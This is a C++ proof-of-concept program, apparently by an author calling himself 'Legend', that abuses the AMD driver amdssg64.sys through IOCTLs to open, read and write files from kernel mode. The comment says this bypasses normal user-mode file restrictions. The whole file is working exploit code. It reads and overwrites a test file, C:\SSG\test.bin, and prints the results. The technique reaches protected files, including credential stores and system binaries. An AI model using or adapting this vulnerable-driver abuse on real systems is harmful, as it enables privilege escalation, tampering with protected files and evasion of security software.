#include "amdssg.h"

/***
 * Author : Legend
 * Date 3/31/2026
 * This is a kernel-mode file I/O proxy/broker driver.
 * User mode sends IOCTLs to open, close, and asynchronously read/write files through the kernel
 * bypassing normal user-mode file API restrictions.
 */

int main() {
    SetConsoleTitle("AMDSSG Ring0 File R/W Exploit - Legend");
    Legend::AMDSSG ssg;
    ssg.Connect(1);

    printf("AMDSSG Device Handle %p | Connected %d | Session %u\n\n",
        ssg.GetDeviceHandle(), ssg.IsConnected(), ssg.GetSessionId());

    if (!ssg.IsConnected()) {
        printf("[-] Failed to connect\n");
        return 1;
    }

    Legend::LFFSR_OPEN_OUTPUT open_out = {};
    NTSTATUS status = ssg.OpenFile(L"C:\\SSG\\test.bin", LFFSR_ACCESS_READ, &open_out);
    printf("[*] open_file (read): 0x%08X | error_code: %u | handle: 0x%llX\n",
        status, open_out.error_code, (unsigned long long)open_out.file_handle);

    if (status == 0 && open_out.file_handle) {
        Legend::LFFSR_RW_OUTPUT rw_out = {};
        char buf[4096] = {};

        status = ssg.ReadFile(open_out.file_handle, buf, sizeof(buf) - 1, 0, &rw_out);
        printf("[*] read_file: 0x%08X | error_code: %u | bytes: %llu\n",
            status, rw_out.error_code, (unsigned long long)rw_out.bytes_transferred);

        if (status == 0 && rw_out.bytes_transferred > 0) {
            printf("[+] File contents:\n%.*s\n", (int)rw_out.bytes_transferred, buf);
        }

        ssg.CloseFile(open_out.file_handle);
        printf("[*] Closed read handle\n\n");
    }

    Legend::LFFSR_OPEN_OUTPUT write_open_out = {};
    status = ssg.OpenFile(L"C:\\SSG\\test.bin", LFFSR_ACCESS_WRITE, &write_open_out);
    printf("[*] open_file (write): 0x%08X | error_code: %u | handle: 0x%llX\n",
        status, write_open_out.error_code, (unsigned long long)write_open_out.file_handle);

    if (status == 0 && write_open_out.file_handle) {
        const char write_data[] = "Legend was here - written from Ring 0 via amdssg64.sys\r\n";
        Legend::LFFSR_RW_OUTPUT rw_out = {};

        status = ssg.WriteFile(write_open_out.file_handle, write_data,
            (uint32_t)(sizeof(write_data) - 1), 0, &rw_out);
        printf("[*] write_file: 0x%08X | error_code: %u | bytes: %llu\n",
            status, rw_out.error_code, (unsigned long long)rw_out.bytes_transferred);

        ssg.CloseFile(write_open_out.file_handle);
        printf("[*] Closed write handle\n\n");
    }

    Legend::LFFSR_OPEN_OUTPUT verify_out = {};
    status = ssg.OpenFile(L"C:\\SSG\\test.bin", LFFSR_ACCESS_READ, &verify_out);

    if (status == 0 && verify_out.file_handle) {
        Legend::LFFSR_RW_OUTPUT rw_out = {};
        char verify_buf[4096] = {};

        status = ssg.ReadFile(verify_out.file_handle, verify_buf, sizeof(verify_buf) - 1, 0, &rw_out);
        printf("[+] Verify read: 0x%08X | bytes: %llu\n", status, (unsigned long long)rw_out.bytes_transferred);

        if (status == 0 && rw_out.bytes_transferred > 0) {
            printf("[+] Written contents:\n%.*s\n", (int)rw_out.bytes_transferred, verify_buf);
        }

        ssg.CloseFile(verify_out.file_handle);
    }

    printf("\nDone. Press enter to exit.\n");
    getchar();
    return 0;
}